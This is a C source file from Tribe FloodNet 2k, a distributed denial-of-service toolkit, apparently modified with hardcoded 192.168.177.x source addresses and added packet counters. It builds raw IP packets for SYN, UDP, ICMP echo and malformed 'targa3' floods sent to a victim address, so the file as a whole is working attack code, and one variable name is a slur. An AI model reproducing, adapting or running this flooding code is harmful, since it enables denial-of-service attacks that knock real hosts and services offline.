/* 
* Tribe FloodNet - 2k edition 
* by Mixter <mixter@newyorkoffice.com> 
* 
* flood.c - packet flood implementations 
* 
* This program is distributed for educational purposes and without any 
* explicit or implicit warranty; in no event shall the author or 
* contributors be liable for any direct, indirect or incidental damages 
* arising in any way out of the use of this software. 
* 
*/ 

#include "tribe.h" 

extern int rcounter; 
extern char rseed[]; 

int rawsock = 0, fw00ding = 0, nospoof = 0, port4syn = 0, psize = 0; 
static char synb[8192]; 
static int fbi = 1, cia = 65535; 
#define CALULATE_IPCKSUM 0 

 unsigned char tcpopt[12]={0x02,0x04,0x05,0xB4,1,3,3,0,0x01,0x01,0x04,0x02}; 
/*unsigned char tcpopt[8]={0x02,0x04,0x05,0xB4,1,0x01,0x04,0x02}; */

/* unsigned char tcpopt[20]={0x02,0x04,0x05,0xB4,4,2,8,0xa,0,0xc,0,0,0,0,0,0,1,3,3,6};  */

unsigned int ipsum,tcpsum; 
struct sa sin2; 

/* 
* caculate initpacket sum. 
*len must be 2*X 
*/ 

unsigned int sum(u16 *buff,int len) 
{ 
     unsigned int cksum; 
     for (cksum = 0; len > 0; len-=2) 
             cksum += *buff++; 
     return cksum; 
} 

extern unsigned char get_ttl(void); 

void syn2(unsigned int victim, unsigned short port) 
{ 
   struct sa sin2; 
   struct ip *ih = (struct ip *) synb; 
   struct tcp *th = (struct tcp *) (synb + sizeof (struct ip)); 
/*   struct phdr *ptcph=(struct phdr*)(synb+sizeof(struct ip )+sizeof(struct tcp));  */
     struct phdr *ptcph=(struct phdr*)(synb+sizeof(tcpopt)+sizeof(struct ip )+sizeof(struct tcp)); 
   ih->ver = 4; 
   ih->ihl = 5; 
   ih->tos = 0x00; 
 /*  ih->tl = sizeof (ih) + sizeof (th); */
   ih->tl = sizeof(tcpopt)+sizeof (ih) + sizeof (th);
   ih->id = htons (getrandom (1024, 65535)); 
   ih->off = htons(0x4000); 
   ih->ttl = 64; 
   ih->pro = TCP; 
   ih->sum = 0; 
   //ih->src = k00lip (); 
   char buf[16] = "192.168.177.52";
   ih->src = resolve(buf);
   /* ih->src=htonl(0x750db21a);  */
   ih->dst = victim; 
   
   th->src = htons (getrandom (1024, 40960)); 
   if (port > 0) 
     th->dst = htons (port); 
   else 
     th->dst = htons (getrandom (0, 65535)); 
   th->seq = htonl (getrandom (0, 65535) + (getrandom (0, 65535) << 16)); 
   th->ack =0;// htons (getrandom (0, 65535)); 
   th->flg = SYN; 
   th->win = htons (8*getrandom (500, 3000));  
   /* th->win = htons(14600); */
   th->sum = 0; 
   th->x2 = 0; 
/*   th->off = 0x8;  */
   th->off = 5+sizeof(tcpopt)/4;
   th->urp =0;// htons (getrandom (0, 65535)); 
   memcpy(synb+sizeof(struct ip)+sizeof(struct tcp),tcpopt,sizeof(tcpopt)); 

/******************************/ 
   ptcph->sip=ih->src; 
   ptcph->dip=ih->dst; 
   ptcph->proto=6; 
   ptcph->zero=0; 
   ptcph->len=htons(sizeof(struct tcp)+sizeof(tcpopt)); 

   th->sum = ip_sum ((u16 *)th, (sizeof(tcpopt)+sizeof (struct phdr) + sizeof (struct tcp) + 

1) & ~1); 

#ifdef CALULATE_IPCKSUM 
ih->sum = ip_sum ((u16 *) synb, (4 * ih->ihl + sizeof (struct tcp) + 1) & 

~1); 
#endif 

   sin2.fam = AF_INET; 
   sin2.dp = th->dst; 
   sin2.add = ih->dst; 
   int ret =sendto (rawsock, synb, 4 * ih->ihl + sizeof(tcpopt)+sizeof (struct tcp), 0, (struct 

sockaddr *) &sin2, sizeof (sin2)); 
   if(ret != -1 && ret != 0){
		pmsg->totalpacket++;
   		pmsg->totalbyte += ret;
		
   }else{
		
   }
   //pmsg->totalpacket++;
   //pmsg->totalbyte += 4 * ih->ihl + sizeof(tcpopt)+sizeof (struct tcp);
} 

static char udpb[1600]; 
unsigned int udpsum; 
struct sa udpsin; 
void udppkt_init(unsigned int larmer) 
{ 
     struct ip *iph; 
     struct udp *udph; 
     struct phdr *pudh; 
     unsigned char *pdata; 
     unsigned short t_len; 
     int i; 
     iph=(struct ip*)udpb; 
     udph=(struct udp*)(udpb+sizeof(struct ip)); 
     pdata=(unsigned char*)(udpb+sizeof(struct ip)+sizeof(struct udp)); 
     pudh=(struct phdr*)(udpb+sizeof(struct ip)+sizeof(struct udp)+psize); 
     t_len=sizeof(struct ip)+sizeof(struct udp)+psize; 
     
     /*Init ip hdr*/ 
     iph->ihl=5;iph->ver=4; 
     iph->tos=0; 
     iph->tl=htons(t_len); 
     iph->id=0;         //random 
     iph->off=0; 
     iph->ttl=0;         //random 
     iph->pro=UDP; 
     iph->src=0;         //random 
     iph->dst=larmer; 
     iph->sum=0; 

     /*init udp hdr*/ 
     udph->src=0; 
     udph->dst=0; 
     udph->len=htons(sizeof(struct udp)+psize); 
     udph->sum=0; 

     /*init pudphdr*/ 
     pudh->dip=larmer; 
     pudh->sip=0;             //random 
     pudh->proto=UDP; 
     pudh->zero=0; 
     pudh->len=htons(t_len-sizeof(struct ip)); 
         
     for(i=0;i<t_len;i++) 
         pdata[i]=getrandom(0,0xff); 

     udpsum=sum((u16*)udph,t_len-sizeof(struct ip)+sizeof(struct phdr)); 
     udpsin.fam=AF_INET; 
     udpsin.dp=0;             //raw socket send,this segment is invalid 
     udpsin.add=larmer; 
} 

void udp(unsigned int larmer) 
{ 
     struct ip *ih; 
     struct udp *uh; 
     unsigned int sumudp=udpsum; 
     
     ih=(struct ip*)udpb; 
     uh=(struct udp*)(udpb+sizeof(struct ip)); 
     
     ih->id = htons(getrandom (16384, 65535)); 
     ih->ttl=get_ttl(); 
	 char buf[16] = "192.168.177.52";
     ih->src = resolve(buf);
     //ih->src = k00lip(); 
     sumudp+=((ih->src)&0xffff); 
     sumudp+=((ih->src)>>16); 

     uh->src=htons (getrandom(2048,4096)); 
     sumudp+=uh->src; 
       uh->dst=htons(getrandom(0,65535)); 
     sumudp+=uh->dst; 
     
       sumudp=(sumudp>>16)+(sumudp&0xffff); 
       sumudp+=(sumudp>>16); 
     uh->sum=(~sumudp); 
     int ret = sendto (rawsock, &udpb,sizeof(struct ip)+sizeof(struct udp)+psize, 0, 

(struct sockaddr *) &udpsin, sizeof (udpsin)); 
	 if(ret != -1 && ret != 0){
		pmsg->totalpacket++;
   		pmsg->totalbyte += ret;
	
   	}else{
	
   	}
} 


void 
udp2 (unsigned int lamer) 
{ 
   int tot_len = (sizeof (struct ip) + sizeof (struct udp) + 1 + psize)&~1; 
   struct sa llama; 
   struct 
     { 
       struct ip iph; 
       struct udp udph; 
       unsigned char evil[65535]; 
     } 
   faggot; 

   faggot.evil[psize] = 0x3F; 

   if (fbi++ > 65535) 
     fbi = 1; 
   if (cia-- < 1) 
     cia = 65535; 

   faggot.iph.ihl = 5; 
   faggot.iph.ver = 4; 
   faggot.iph.tos = 0x00; 
   faggot.iph.tl = htons (tot_len); 
   faggot.iph.id = htons (getrandom (0, 65535)); 
   faggot.iph.off = 0; 
   faggot.iph.ttl = getrandom (200, 255); 
   faggot.iph.pro = UDP; 
   //faggot.iph.src = k00lip (); 
   char buf[16] = "192.168.177.52";
   faggot.iph.src = resolve(buf); 
   faggot.iph.dst = lamer; 
   #ifdef CALULATE_IPCKSUM 
   faggot.iph.sum = ip_sum ((u16 *) & faggot.iph, sizeof (faggot.iph)); 
   #endif 

   faggot.udph.src = htons (cia); 
   faggot.udph.dst = htons (fbi); 
   faggot.udph.len = htons (tot_len-sizeof(struct ip)); 
   faggot.udph.sum = 0; 
       { 
         struct phdr *pudph=(struct phdr*)(((char*)&faggot)+tot_len); 
         pudph->sip=faggot.iph.src; 
         pudph->dip=faggot.iph.dst; 
         pudph->proto=UDP; 
         pudph->zero=0;pudph->len=htons(tot_len-20); 
         faggot.udph.sum = cksum ((u16 *) & faggot.udph, tot_len-sizeof(struct 

ip)+sizeof(struct phdr)); 
       }   

   llama.fam = AF_INET; 
   llama.dp = faggot.udph.dst; 
   llama.add = lamer; 

  int ret = sendto (rawsock, &faggot, tot_len, 0, (struct sockaddr *) &llama, sizeof 

(llama)); 
	if(ret != -1 && ret != 0){
		pmsg->totalpacket++;
   		pmsg->totalbyte += ret;
   	}else{
   	}
} 

void 
icmp (unsigned int lamer, unsigned int src) 
{ 
   struct sa pothead; 
   struct ip *iph; 
   struct icmp *icmph; 
   char *packet; 
   int pktsize = sizeof (struct ip) + sizeof (struct icmp) + 64; 
   if (psize) 
     pktsize += psize; 

   packet = malloc (pktsize); 
   iph = (struct ip *) packet; 
   icmph = (struct icmp *) (packet + sizeof (struct ip)); 
   memset (packet, 0, pktsize); 
   iph->ver = 4; 
   iph->ihl = 5; 
   iph->tos = 0; 
   iph->tl = htons (pktsize); 
   iph->id = htons (getpid ()); 
   iph->off = 0; 
   iph->ttl = 0x08; 
   iph->pro = ICMP; 
   iph->sum = 0; 
   if (src == 0) 
     { 
	   char buf[16] = "192.168.177.51";
       //iph->src = k00lip (); 
       iph->src = resolve(buf); 
       iph->dst = lamer; 
     } 
   else 
     { 
       iph->src = lamer; 
       iph->dst = src; 
     } 
   icmph->type = ICMP_ECHO; 
   icmph->code = 0; 
   icmph->sum = htons (~(ICMP_ECHO << 8)); 

   pothead.fam = AF_INET; 
   pothead.dp = htons (0); 
   pothead.add = iph->dst; 

   int ret = sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &pothead, sizeof 

(struct sockaddr)); 
   if(ret != -1 && ret != 0){
		pmsg->totalpacket++;
   		pmsg->totalbyte += ret;
   }else{
		
   }
   free (packet); 
} 

void 
targa3 (unsigned int victim) 
{ 
   int mysize = sizeof (struct ip) + getrandom (128, 512) + psize, i; 
   char *packet = calloc (1, mysize); 
   struct ip *iph = (struct ip *) packet; 
   struct udp *udh = (struct udp *) (packet + sizeof (struct ip)); 
   struct tcp *tch = (struct tcp *) (packet + sizeof (struct ip)); 
   struct icmp *ich = (struct icmp *) (packet + sizeof (struct ip)); 
   struct sa sin2; 

   int proto[14] = 
   {                 /* known internet protcols */ 
     0, 1, 2, 4, 6, 8, 12, 17, 22, 41, 58, 255, 0, 
   }; 
   int frags[10] = 
   {                 /* (un)common fragment values */ 
     0, 0, 0, 8192, 0x4, 0x6, 16383, 1, 0, 
   }; 
   int flags[7] = 
   {                 /* (un)common message flags */ 
     0, 0, 0, 0x4, 0, 0x1, 
   }; 

   for (i = 0; i < mysize; i++) 
     { 
       if (rcounter-- < 1) 
     random_init (); 
       packet[i] = rseed[rcounter]; 
     } 
   proto[13] = getrandom (0, 255); 
   frags[9] = getrandom (0, 8100); 
   flags[6] = getrandom (0, 0xf); 
   iph->ver = 4; 
   iph->ihl = 5; 
   iph->tos = 0; 
   iph->tl = htons (mysize); 
   iph->id = htons (getrandom (0, 65535) + (getrandom (0, 65535) << 8)); 
   iph->ttl = 0x00; 
   iph->pro = proto[(int) getrandom (0, 13)]; 
   switch (iph->pro) 
     { 
     case TCP: 
       tch->sum = 0; 
       tch->sum = cksum ((u16 *) packet, mysize >> 1); 
       iph->off = htons(0x4000); ;
       break; 
     case ICMP: 
       ich->sum = 0; 
       ich->sum = cksum ((u16 *) packet, mysize >> 1); 
       iph->off = 0;
       break; 
     case UDP: 
       udh->sum = 0; 
       udh->sum = cksum ((u16 *) packet, mysize >> 1); 
       iph->off = 0;
       break; 
     } 
   /* iph->off = htons (frags[(int) getrandom (0, 9)]);  */

   iph->sum = 0; 
   iph->src = getrandom (0, 65535) + (getrandom (0, 65535) << 8); 
   iph->dst = victim; 

   sin2.fam = AF_INET; 
   sin2.dp = htons (0); 
   sin2.add = victim; 

   sendto (rawsock, 
       packet, 
       mysize, 
       flags[(int) getrandom (0, 6)], 
       (struct sockaddr *) &sin2, 
       sizeof (sin2)); 
   free (packet);         /* free willy */ 
}
